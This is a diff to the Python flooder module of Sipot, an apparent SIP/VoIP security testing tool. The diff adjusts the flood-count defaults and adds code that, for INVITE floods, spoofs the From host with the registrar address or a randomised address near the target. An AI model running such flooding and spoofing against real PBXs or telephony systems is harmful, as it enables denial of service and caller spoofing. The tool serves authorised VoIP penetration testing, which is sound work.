@@ -2,8 +2,7 @@
 #===================================================================================================================
 __GPL__ = """
 
-   Sipvicious extension line scanner scans SIP PaBXs for valid extension lines
-   Copyright (C) 2012 Sandro Gauci <sandro@enablesecurity.com>
+   Sipot extension: flooder module
 
    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
@@ -47,7 +46,7 @@ def module_Usage(usage):
 def module_Options(parser):
 	from optparse import OptionGroup
 	group_flooder = OptionGroup(parser, 'Flooding Mode', 'use this options to set flooding parameters')
-	group_flooder.add_option('',   '--flood-number', dest='flood_num', default=666, type="int", help='Sets the number of messages to be sent by flooding mode. Default is 500.')
+	group_flooder.add_option('',   '--flood-number', dest='flood_num', default=600, type="int", help='Sets the number of messages to be sent by flooding mode. Default is 500.')
 	group_flooder.add_option('',   '--flood-method', dest='flood_method', default='REGISTER', help='Set the method to flood. Default is REGISTER.')
 	group_flooder.add_option('',   '--flood-msg-file', dest='flood_msg_file', default=None, help='Provide a message from file to flood.')
 	group_flooder.add_option('', 	'--flood-file-noparse', default=False, action='store_true', dest='flood_noparse', help='Prevents the flooder to parse the message. By default try to parse.')
@@ -114,6 +113,7 @@ class flooderUser(User):
 				except ValueError, E: pass # TODO: send 400 response to non-ACK request
 			else:
 				m = self._ua.createRequest(self.flood_method)
+				m.To = rfc3261_IPv6.Header(str(self.app.options.to.uri), 'To')
 				m.Contact = rfc3261_IPv6.Header(str(self._stack.uri), 'Contact')
 				m.Contact.value.uri.user = self.localParty.uri.user
 				m.Expires = rfc3261_IPv6.Header(str(self.app.options.register_interval), 'Expires')
@@ -134,7 +134,17 @@ class flooderUser(User):
 					message_generated = self.message_generated
 					# Modify message_generated: extension (To,From), tag, Call-ID
 					extension = self.ExtensionsGenerator.next()
-					message_generated.From.value.uri.user = message_generated.From.value.displayName =  message_generated.To.value.uri.user = message_generated.To.value.displayName = extension
+					if message_generated.method == "INVITE":
+						if self.app.options.registrar_ip != self.app.options.to.uri.host:
+							SourceFakeAddr = self.app.options.registrar_ip
+						else:
+							SourceFakeAddr = str(self.app.options.to.uri.host).split('.')
+							SourceFakeAddr[3] = str(random.randint(0,254))
+							SourceFakeAddr = ".".join(SourceFakeAddr)
+						message_generated.From.value.uri.user = message_generated.From.value.displayName =  extension
+						message_generated.From.value.uri.host = SourceFakeAddr
+					else:
+						message_generated.From.value.uri.user = message_generated.From.value.displayName =  message_generated.To.value.uri.user = message_generated.To.value.displayName = extension
 					message_generated.From.tag=str(random.randint(0,2**31))
 					message_generated['Call-ID'] = rfc3261_IPv6.Header(str(random.randint(0,2**31)) + '@' + (message_generated.From.value.uri.host or 'localhost'), 'Call-ID')
 					yield (message_generated)
